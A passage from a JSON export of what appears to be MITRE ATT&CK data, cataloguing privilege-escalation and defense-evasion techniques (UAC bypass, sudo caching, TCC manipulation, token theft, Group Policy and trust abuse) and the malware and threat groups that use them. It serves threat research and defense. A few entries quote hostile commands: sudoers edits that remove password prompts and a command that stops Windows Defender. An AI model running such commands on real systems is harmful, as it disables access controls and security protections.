                        "Name": "Grandoreiro",
                        "Description": "<name> can bypass UAC by registering as the default handler for .MSC files.[36]"
                    },
                    "S0132": {
                        "ID": "S0132",
                        "Name": "H1N1",
                        "Description": "<name> bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).[37]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can use fileless UAC bypass and create an elevated COM object to escalate privileges.[38][39]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe.[40]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> will perform UAC bypass either through fodhelper.exe or eventvwr.exe.[41]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has bypassed UAC by performing token impersonation as well as an RPC-based method, this included bypassing UAC set to \"AlwaysNotify\".[42][43]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has utilized multiple techniques to bypass UAC.[44]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> uses various techniques to bypass UAC.[45]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, the threat actors used the malicious NTWDBLIB.DLL and cliconfig.exe to bypass UAC protections.[46]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> bypassed User Access Control (UAC).[47]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> installer can use UAC bypass techniques to install the payload.[48]"
                    },
                    "S0254": {
                        "ID": "S0254",
                        "Name": "PLAINTEE",
                        "Description": "An older variant of <name> performs UAC bypass.[49]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> can utilize multiple methods to bypass UAC.[50]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.[51]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> can generate a UAC pop-up Window to prompt the target user to run a command as the administrator.[52]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can use UACMe for privilege escalation.[53][54]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> can bypass UAC to escalate privileges.[22]"
                    },
                    "S0332": {
                        "ID": "S0332",
                        "Name": "Remcos",
                        "Description": "<name> has a command for UAC bypassing.[55]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.[56]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has attempted to bypass UAC using fodhelper.exe to escalate privileges.[57]"
                    },
                    "S0074": {
                        "ID": "S0074",
                        "Name": "Sakula",
                        "Description": "<name> contains UAC bypass code for both 32- and 64-bit systems.[58]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> attempts to disable UAC remote restrictions by modifying the Registry.[59]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.[60]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> contains a number of modules that can bypass UAC, including through Window's Device Manager, Manage Optional Features, and an image hijack on the .msc file extension.[61]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "A <name> tool can use a public UAC bypass method to elevate privileges.[62]"
                    },
                    "S0116": {
                        "ID": "S0116",
                        "Name": "UACMe",
                        "Description": "<name> contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.[5]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> can use sdclt.exe to bypass UAC in Windows 10 to escalate privileges; for older Windows versions <name> can use the IFileOperation exploit to bypass the UAC module.[63][64]"
                    },
                    "S0612": {
                        "ID": "S0612",
                        "Name": "WastedLocker",
                        "Description": "<name> can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.[65]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> can use a variant of the sysprep UAC bypass.[66]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "Many <name> samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.[67]"
                    }
                }
            },
            "003": {
                "name": "Sudo and Sudo Caching",
                "href": "/techniques/T1548/003",
                "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.Within Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"[1] Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL.[2] Elevated privileges are required to edit this file though.Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers.[3] In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",
                "Procedure": {
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use sudo to run a command.[4]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> adds admin  ALL=(ALL) NOPASSWD: ALL to the /etc/sudoers file.[5]"
                    },
                    "S0279": {
                        "ID": "S0279",
                        "Name": "Proton",
                        "Description": "<name> modifies the tty_tickets line in the sudoers file.[6]"
                    }
                }
            },
            "004": {
                "name": "Elevated Execution with Prompt",
                "href": "/techniques/T1548/004",
                "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.[1] The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.Adversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.[2][3][4] This technique may be combined with Masquerading to trick the user into granting escalated privileges to malicious code.[2][3] This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.[2]",
                "Procedure": {
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "<name> can escalate privileges to root by asking the user for credentials.[3]"
                    }
                }
            },
            "005": {
                "name": "Temporary Elevated Cloud Access",
                "href": "/techniques/T1548/005",
                "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.[1]Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the iam.serviceAccountTokenCreator role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.[2][3][4][5] In Exchange Online, the ApplicationImpersonation role allows a service account to use the permissions associated with specified user accounts.[6] Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the PassRole permission can allow a service they create to assume a given role, while in GCP, users with the iam.serviceAccountUser role can attach a service account to a resource.[7][2]While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.[8][9]Note: this technique is distinct from Additional Cloud Roles, which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control Additional Cloud Roles that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.[10]",
                "Procedure": {}
            },
            "006": {
                "name": "TCC Manipulation",
                "href": "/techniques/T1548/006",
                "description": "Adversaries can manipulate or abuse the Transparency, Consent, & Control (TCC) service or database to execute malicious applications with elevated permissions. TCC is a Privacy & Security macOS control mechanism used to determine if the running process has permission to access the data or services protected by TCC, such as screen sharing, camera, microphone, or Full Disk Access (FDA).When an application requests to access data or a service protected by TCC, the TCC daemon (tccd) checks the TCC database, located at /Library/Application Support/com.apple.TCC/TCC.db (and ~/ equivalent), for existing permissions. If permissions do not exist, then the user is prompted to grant permission. Once permissions are granted, the database stores the application's permissions and will not prompt the user again unless reset. For example, when a web browser requests permissions to the user's webcam, once granted the web browser may not explicitly prompt the user again.[1]Adversaries may manipulate the TCC database or otherwise abuse the TCC service to execute malicious content. This can be done in various ways, including using privileged system applications to execute malicious payloads or manipulating the database to grant their application TCC permissions. For example, adversaries can use Finder, which has FDA permissions by default, to execute malicious AppleScript while preventing a user prompt. For a system without System Integrity Protection (SIP) enabled, adversaries have also manipulated the operating system to load an adversary controlled TCC database using environment variables and Launchctl.[2][3]Adversaries may also opt to instead inject code (e.g., Process Injection) into targeted applications with the desired TCC permissions.",
                "Procedure": {}
            }
        },
        "tactic": "Privilege Escalation",
        "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.[1][2] An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.[3][4]",
        "Procedure": {}
    },
    "T1134": {
        "ttp_name": "Access Token Manipulation",
        "ttp_id": "T1134",
        "href": "/techniques/T1134",
        "subtechnique": {
            "001": {
                "name": "Token Impersonation/Theft",
                "href": "/techniques/T1134/001",
                "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using DuplicateToken or DuplicateTokenEx.[1] The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.An adversary may perform Token Impersonation/Theft when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally Create Process with Token using CreateProcessWithTokenW or CreateProcessAsUserW. Token Impersonation/Theft is also distinct from Make and Impersonate Token in that it refers to duplicating an existing token, rather than creating a new one.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.[2]"
                    },
                    "S0456": {
                        "ID": "S0456",
                        "Name": "Aria-body",
                        "Description": "<name> has the ability to duplicate a token from ntprint.exe.[3]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can impersonate a lsass.exe or vmtoolsd.exe token.[4]"
                    },
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> can use the tokens of users to create processes on infected systems.[5]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can steal access tokens from exiting processes.[6][7]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has the ability to duplicate the user\u2019s token.[8]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.[9][10]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> uses token manipulation with NtFilterToken as part of UAC bypass.[11][12]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> can impersonate a logged-on user's security context using a call to the ImpersonateLoggedOnUser API.[13]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.[14]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can obtain the token from the user that launched the explorer.exe process to avoid affecting the desktop of the SYSTEM user.[15]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> can impersonate tokens using LogonUser, ImpersonateLoggedOnUser, and ImpersonateNamedPipeClient.[16]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can find a process owned by a specific user and impersonate the associated token.[17]"
                    },
                    "S0623": {
                        "ID": "S0623",
                        "Name": "Siloscape",
                        "Description": "<name> impersonates the main thread of CExecSvc.exe by calling NtImpersonateThread.[18]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> attempts to impersonate an anonymous token to enumerate bindings in the service control manager.[19]"
                    },
                    "S1011": {
                        "ID": "S1011",
                        "Name": "Tarrask",
                        "Description": "<name> leverages token theft to obtain lsass.exe security permissions.[20]"
                    }
                }
            },
            "002": {
                "name": "Create Process with Token",
                "href": "/techniques/T1134/002",
                "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as CreateProcessWithTokenW and runas.[1]Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via Token Impersonation/Theft or created via Make and Impersonate Token before being used to create a process.While this technique is distinct from Token Impersonation/Theft, the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",
                "Procedure": {
                    "S0456": {
                        "ID": "S0456",
                        "Name": "Aria-body",
                        "Description": "<name> has the ability to execute a process using runas.[2]"
                    },
                    "S0344": {
                        "ID": "S0344",
                        "Name": "Azorult",
                        "Description": "<name> can call WTSQueryUserToken and CreateProcessAsUser to start a new process with local system privileges.[3]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.[4]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use Invoke-RunAs to make tokens.[5]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user.[6][7]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.[8][9]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> can attempt to gain administrative privileges using token impersonation.[10]"
                    },
                    "S0378": {
                        "ID": "S0378",
                        "Name": "PoshC2",
                        "Description": "<name> can use Invoke-RunAs to make tokens.[11]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can launch an instance of itself with administrative rights using runas.[12]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> RPC backdoors can impersonate or steal process tokens before executing commands.[13]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "The <name> third stage can use the AdvancedRun.exe tool to execute commands in the context of the Windows TrustedInstaller group via %TEMP%\\AdvancedRun.exe\" /EXEFilename \"C:\\Windows\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run.[14]"
                    },
                    "S0412": {
                        "ID": "S0412",
                        "Name": "ZxShell",
                        "Description": "<name> has a command called RunAs, which creates a new process as another user or process context.[15]"
                    }
                }
            },
            "003": {
                "name": "Make and Impersonate Token",
                "href": "/techniques/T1134/003",
                "description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the LogonUser function.[1] The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.This behavior is distinct from Token Impersonation/Theft in that this refers to creating a new user token instead of stealing or duplicating an existing one.",
                "Procedure": {
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can make tokens from known credentials.[2]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has utilized tools such as Incognito V2 for token manipulation and impersonation.[3]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can create a token for a different user.[4]"
                    }
                }
            },
            "004": {
                "name": "Parent PID Spoofing",
                "href": "/techniques/T1134/004",
                "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use.[1] This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.[2]Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment.[3] This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.[4][3]Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.[5]",
                "Procedure": {
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can spawn processes with alternate PPIDs.[6][7]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> relies on parent PID spoofing as part of its \"rootkit-like\" functionality to evade detection via Task Manager or Process Explorer.[8]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has used parent PID spoofing to spawn a new cmd process using CreateProcessW and a handle to Taskmgr.exe.[9]"
                    },
                    "S0501": {
                        "ID": "S0501",
                        "Name": "PipeMon",
                        "Description": "<name> can use parent PID spoofing to elevate privileges.[10]"
                    }
                }
            },
            "005": {
                "name": "SID-History Injection",
                "href": "/techniques/T1134/005",
                "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. [1] An account can hold additional SIDs in the SID-History Active Directory attribute [2], allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values [3] may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.",
                "Procedure": {
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can add a SID-History to a user if on a domain controller.[4]"
                    },
                    "S0002": {
                        "ID": "S0002",
                        "Name": "Mimikatz",
                        "Description": "<name>'s MISC::AddSid module can append any SID or user/group account to a user's SID-History. <name> also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.[5][6]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. Token Impersonation/Theft) or used to spawn a new process (i.e. Create Process with Token). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.[1]Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
        "Procedure": {
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can gain system level privilege by passing SeDebugPrivilege to the AdjustTokenPrivilege API.[2]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware has the ability modify access tokens.[3][4]"
            },
            "G0108": {
                "ID": "G0108",
                "Name": "Blue Mockingbird",
                "Description": "malware has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.[5]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation.[6]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware has used SeDebugPrivilege and AdjustTokenPrivileges to elevate privileges.[7]"
            },
            "S0038": {
                "ID": "S0038",
                "Name": "Duqu",
                "Description": "malware examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.[8]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can use PowerSploit's Invoke-TokenManipulation to manipulate access tokens.[9]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has used has used Metasploit\u2019s named-pipe impersonation technique to escalate privileges.[10]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can use token manipulation to bypass UAC on Windows7 systems.[11]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can use AdjustTokenPrivileges to grant itself privileges for debugging with SeDebugPrivilege, creating backups with SeBackupPrivilege, loading drivers with SeLoadDriverPrivilege, and shutting down a local system with SeShutdownPrivilege.[12][13]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can adjust token privileges.[14]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware has attempted to get the access token of a process by calling OpenProcessToken. If malware gets the access token, then it attempt to modify the token privileges with AdjustTokenPrivileges.[15]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can use AdjustTokenPrivileges() to elevate privileges.[16]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "malware can enable SeDebugPrivilege and adjust token privileges.[17]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware can use Invoke-TokenManipulation for manipulating tokens.[18]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware's Invoke-TokenManipulation Exfiltration module can be used to manipulate tokens.[19][20]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has attempted to adjust its token privileges to have the SeDebugPrivilege.[21]"
            },
            "S0633": {
                "ID": "S0633",
                "Name": "Sliver",
                "Description": "malware has the ability to manipulate user tokens on targeted Windows systems.[22][23]"
            },
            "S0058": {
                "ID": "S0058",
                "Name": "SslMM",
                "Description": "malware contains a feature to manipulate process privileges and tokens.[24]"
            },
            "S0562": {
                "ID": "S0562",
                "Name": "SUNSPOT",
                "Description": "malware modified its security token to grants itself debugging privileges by adding SeDebugPrivilege.[25]"
            }
        }
    },
    "T1484": {
        "ttp_name": "Domain or Tenant Policy Modification",
        "ttp_id": "T1484",
        "href": "/techniques/T1484",
        "subtechnique": {
            "001": {
                "name": "Group Policy Modification",
                "href": "/techniques/T1484/001",
                "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\.[1][2] Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.Malicious GPO modifications can be used to implement many other malicious behaviors such as Scheduled Task/Job, Disable or Modify Tools, Ingress Tool Transfer, Create Account, Service Execution,  and more.[2][3][4][5][6] Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.[3]For example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious Scheduled Task/Job by modifying GPO settings, in this case modifying <GPO_PATH>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml.[3][4] In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <GPO_PATH>\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.[7]",
                "Procedure": {
                    "C0034": {
                        "ID": "C0034",
                        "Name": "2022 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware.[8]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has used Group Policy to deploy batch scripts for ransomware deployment.[9]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> can modify the GPO to evade detection.[10] [11]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use New-GPOImmediateTask to modify a GPO that will install and execute a malicious Scheduled Task/Job.[12]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> has the ability to deploy through an infected system's default domain policy.[13]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has used Group Policy Objects to deploy batch scripts.[14]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> can use group policy to push a scheduled task from the AD to all network machines.[15]"
                    },
                    "S1058": {
                        "ID": "S1058",
                        "Name": "Prestige",
                        "Description": "<name> has been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller.[16]"
                    }
                }
            },
            "002": {
                "name": "Trust Modification",
                "href": "/techniques/T1484/002",
                "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.[1] These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge SAML Tokens without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.[2] An adversary may also add a new federated identity provider to an identity tenant such as Okta, which may enable the adversary to authenticate as any user of the tenant.[3]",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can create a backdoor by converting a domain to a federated domain which will be able to authenticate any user across the tenant. <name> can also modify DesktopSSO information.[4][5]"
                    },
                    "G1015": {
                        "ID": "G1015",
